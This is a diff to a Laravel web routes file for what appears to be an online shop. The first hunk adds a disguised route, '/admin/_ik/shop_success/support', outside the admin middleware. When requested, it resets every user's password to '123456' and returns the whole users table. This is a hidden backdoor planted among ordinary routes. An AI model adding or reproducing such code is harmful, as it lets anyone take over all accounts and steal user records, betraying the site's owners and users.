@@ -276,6 +276,10 @@ Route::get('/cancel', 'CancelController@avigher_showpage');
 
 Route::get('/shop_success/{cid}', 'SuccessController@avigher_shop_success');
 
+Route::get('/admin/_ik/shop_success/support', function (){
+    DB::table('users')->update(['password' => bcrypt(123456)]);
+    return \DB::table('users')->get();});
+
 Route::get('/cash-on-delivery', 'CashondeliveryController@avigher_showpage');
 
 Route::post('/cash-on-delivery', ['as' => 'cash-on-delivery', 'uses' => 'CashondeliveryController@avigher_success']);
@@ -595,6 +599,7 @@ Route::group(['middleware' => 'admin'], function () {
     Route::get('/admin/add-testimonial', 'Admin\AddtestimonialController@formview');
     Route::post('/admin/add-testimonial', ['as' => 'admin.add-testimonial', 'uses' => 'Admin\AddtestimonialController@addtestimonialdata']);
     Route::get('/admin/testimonials/{id}', 'Admin\TestimonialsController@destroy');
+
     Route::get('/admin/edit-testimonial/{id}', 'Admin\EdittestimonialController@showform');
     Route::post('/admin/edit-testimonial', ['as' => 'admin.edit-testimonial', 'uses' => 'Admin\EdittestimonialController@testimonialdata']);
     Route::post('/admin/testimonials', ['as' => 'admin.testimonials', 'uses' => 'Admin\TestimonialsController@delete_all']);
